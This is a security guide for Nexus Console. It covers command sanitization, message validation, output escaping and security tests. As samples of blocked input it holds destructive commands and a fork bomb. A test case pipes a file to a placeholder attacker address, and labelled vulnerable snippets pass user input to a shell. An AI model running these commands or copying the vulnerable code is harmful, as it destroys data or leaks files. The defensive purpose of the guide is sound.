# Security Guide for Nexus Console

## Input Sanitization

Nexus Console implements multiple layers of input sanitization to prevent security vulnerabilities. This guide covers how sanitization works and how to implement it correctly.

## 1. Command Input Sanitization

### Overview

All terminal commands pass through the `CommandSanitizer` before execution. This prevents:
- Command injection attacks
- Path traversal attempts
- Fork bombs and resource exhaustion
- Execution of dangerous system commands

### Implementation

```typescript
import CommandSanitizer from '@security/CommandSanitizer';

const sanitizer = new CommandSanitizer({
  allowedCommands: ['ls', 'cd', 'pwd', 'echo'],  // Optional allowlist
  blockDangerousFlags: true,                      // Block dangerous command flags
  maxCommandLength: 1024                          // Prevent buffer overflow
});

// Sanitize user input
const userInput = "ls && rm -rf /";
const sanitized = sanitizer.sanitize(userInput);

if (sanitized === false) {
  // Command was blocked for security reasons
  console.error('Dangerous command blocked');
} else {
  // Safe to execute
  terminal.execute(sanitized);
}
```

### Blocked Patterns

The sanitizer blocks:

1. **Command Chaining**
   - `&&`, `||`, `;`, `|`
   - Command substitution: `$(...)`, `` `...` ``
   - Background execution: `&`

2. **Path Traversal**
   - `../`, `..\`
   - Absolute paths to system directories
   - Home directory expansion: `~`

3. **Dangerous Commands**
   - File deletion: `rm`, `rmdir`, `del`
   - System modification: `mkfs`, `dd`, `format`
   - Permission changes: `chmod`, `chown`
   - System control: `shutdown`, `reboot`, `kill`

4. **Resource Exhaustion**
   - Fork bombs: `:(){ :|:& };:`
   - Infinite loops: `while true; do`

### Custom Sanitization Rules

```typescript
// Add custom blocked patterns
sanitizer.addBlockedPattern(/custom-dangerous-pattern/g);

// Add custom allowed commands
sanitizer.addAllowedCommand('git');

// Implement custom validation
sanitizer.addValidator((command) => {
  // Return false to block, true to allow
  return !command.includes('sensitive-data');
});
```

## 2. WebSocket Message Sanitization

### Message Validation

All WebSocket messages are validated against strict schemas:

```typescript
interface ConsoleMessage {
  type: MessageType;      // Enum of allowed types
  sessionId: string;      // UUID format enforced
  timestamp: number;      // Must be recent
  data?: unknown;         // Type-specific validation
}

// Validation example
function validateMessage(message: unknown): ConsoleMessage {
  // Type checking
  if (!isValidMessageType(message.type)) {
    throw new SecurityError('Invalid message type');
  }
  
  // Session validation
  if (!isValidUUID(message.sessionId)) {
    throw new SecurityError('Invalid session ID');
  }
  
  // Timestamp validation (prevent replay attacks)
  const age = Date.now() - message.timestamp;
  if (age > MAX_MESSAGE_AGE) {
    throw new SecurityError('Message too old');
  }
  
  return message as ConsoleMessage;
}
```

### Size Limits

```typescript
const MAX_MESSAGE_SIZE = 1024 * 1024; // 1MB

function validateMessageSize(data: string): void {
  if (data.length > MAX_MESSAGE_SIZE) {
    throw new SecurityError('Message too large');
  }
}
```

## 3. Terminal Output Sanitization

### ANSI Escape Sequence Filtering

Dangerous terminal escape sequences are filtered:

```typescript
function sanitizeTerminalOutput(output: string): string {
  // Remove dangerous escape sequences
  const dangerous = [
    /\x1b\]\d+;[^\x07]*\x07/g,  // OSC sequences
    /\x1b\[\d*;\d*[Hf]/g,       // Cursor positioning
    /\x1b\[2J/g,                 // Clear screen
  ];
  
  let sanitized = output;
  dangerous.forEach(pattern => {
    sanitized = sanitized.replace(pattern, '');
  });
  
  return sanitized;
}
```

### XSS Prevention

When displaying terminal output in HTML:

```typescript
function escapeHtml(str: string): string {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#39;'
  };
  return str.replace(/[&<>"']/g, m => map[m]);
}

// Safe rendering
const safeOutput = escapeHtml(terminalOutput);
element.innerHTML = `<pre>${safeOutput}</pre>`;
```

## 4. File Path Sanitization

### Path Validation

```typescript
import path from 'path';

function sanitizePath(userPath: string, basePath: string): string {
  // Resolve to absolute path
  const resolved = path.resolve(basePath, userPath);
  
  // Ensure it's within allowed directory
  if (!resolved.startsWith(basePath)) {
    throw new SecurityError('Path traversal attempt');
  }
  
  // Additional checks
  if (resolved.includes('\0')) {
    throw new SecurityError('Null byte injection');
  }
  
  return resolved;
}
```

### Allowed Paths Configuration

```typescript
const ALLOWED_PATHS = [
  '/workspace',
  '/tmp/nexus-console',
  process.env.USER_DATA_DIR
].filter(Boolean);

function isAllowedPath(filePath: string): boolean {
  return ALLOWED_PATHS.some(allowed => 
    filePath.startsWith(allowed)
  );
}
```

## 5. Authentication Token Sanitization

### JWT Validation

```typescript
function sanitizeAuthToken(token: string): string {
  // Basic format validation
  if (!/^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+$/.test(token)) {
    throw new SecurityError('Invalid token format');
  }
  
  // Length limits
  if (token.length > 4096) {
    throw new SecurityError('Token too long');
  }
  
  return token;
}
```

### Session ID Generation

```typescript
import { randomBytes } from 'crypto';

function generateSecureSessionId(): string {
  // Use cryptographically secure random
  const bytes = randomBytes(32);
  return bytes.toString('hex');
}
```

## 6. Environment Variable Sanitization

### Safe Environment Access

```typescript
function sanitizeEnvVar(name: string, value: string): string {
  // Validate variable name
  if (!/^[A-Z_][A-Z0-9_]*$/i.test(name)) {
    throw new SecurityError('Invalid environment variable name');
  }
  
  // Sanitize value
  const sanitized = value
    .replace(/[\r\n]/g, '')    // Remove newlines
    .replace(/[^\x20-\x7E]/g, ''); // ASCII printable only
  
  // Length limit
  if (sanitized.length > 32768) {
    throw new SecurityError('Environment variable too long');
  }
  
  return sanitized;
}
```

## 7. Best Practices

### Always Sanitize at Boundaries

```typescript
// Good: Sanitize at entry point
app.post('/terminal/input', (req, res) => {
  const sanitized = sanitizer.sanitize(req.body.command);
  if (sanitized === false) {
    return res.status(400).json({ error: 'Invalid command' });
  }
  terminal.execute(sanitized);
});

// Bad: Trusting input deeper in the stack
function executeCommand(command: string) {
  // Don't assume command is already sanitized!
  shell.exec(command); // Dangerous!
}
```

### Defense in Depth

Implement multiple layers of sanitization:

1. **Client-side validation** (for UX, not security)
2. **Server-side validation** (primary security layer)
3. **Transport encryption** (TLS/WSS)
4. **Output encoding** (prevent XSS)
5. **CSP headers** (last line of defense)

### Regular Security Audits

```bash
# Run security tests
npm run test:security

# Check for vulnerabilities
npm audit

# Lint for security issues
npm run lint:security
```

### Logging and Monitoring

```typescript
// Log security events
function logSecurityEvent(event: SecurityEvent): void {
  logger.warn('Security event', {
    type: event.type,
    source: event.source,
    timestamp: Date.now(),
    // Don't log sensitive data!
    metadata: sanitizeLogData(event.metadata)
  });
}
```

## 8. Common Vulnerabilities and Mitigations

### Command Injection

**Vulnerable:**
```typescript
const userInput = req.body.filename;
shell.exec(`cat ${userInput}`); // Dangerous!
```

**Secure:**
```typescript
const sanitized = sanitizer.sanitize(`cat ${userInput}`);
if (sanitized !== false) {
  terminal.execute(sanitized);
}
```

### Path Traversal

**Vulnerable:**
```typescript
const file = req.params.file;
fs.readFile(`/data/${file}`); // Could access any file!
```

**Secure:**
```typescript
const safePath = sanitizePath(req.params.file, '/data');
fs.readFile(safePath);
```

### XSS in Terminal Output

**Vulnerable:**
```typescript
element.innerHTML = terminalOutput; // Could execute scripts!
```

**Secure:**
```typescript
element.textContent = terminalOutput; // Text only
// OR
element.innerHTML = escapeHtml(terminalOutput);
```

## 9. Security Testing

### Unit Tests

```typescript
describe('CommandSanitizer', () => {
  test('blocks command injection', () => {
    const dangerous = [
      'ls; rm -rf /',
      'echo $(whoami)',
      'cat file.txt | mail attacker@evil.com'
    ];
    
    dangerous.forEach(cmd => {
      expect(sanitizer.sanitize(cmd)).toBe(false);
    });
  });
});
```

### Integration Tests

```typescript
test('WebSocket rejects malformed messages', async () => {
  const ws = new WebSocket('ws://localhost:3000');
  
  ws.send(JSON.stringify({
    type: 'INVALID_TYPE',
    sessionId: 'not-a-uuid'
  }));
  
  const response = await waitForMessage(ws);
  expect(response.type).toBe('error');
  expect(response.code).toBe('INVALID_MESSAGE');
});
```

### Fuzzing

```typescript
import { fuzz } from '@security/fuzzer';

test('sanitizer handles fuzzing', () => {
  const inputs = fuzz.generate(10000);
  
  inputs.forEach(input => {
    expect(() => {
      sanitizer.sanitize(input);
    }).not.toThrow();
  });
});
```

## 10. Incident Response

If a security issue is discovered:

1. **Isolate** - Disable affected functionality
2. **Assess** - Determine scope and impact
3. **Patch** - Fix the vulnerability
4. **Test** - Verify the fix
5. **Deploy** - Roll out the update
6. **Monitor** - Watch for exploitation attempts
7. **Document** - Update security docs

## Further Reading

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
- [WebSocket Security](https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API/Writing_WebSocket_servers#security_considerations)
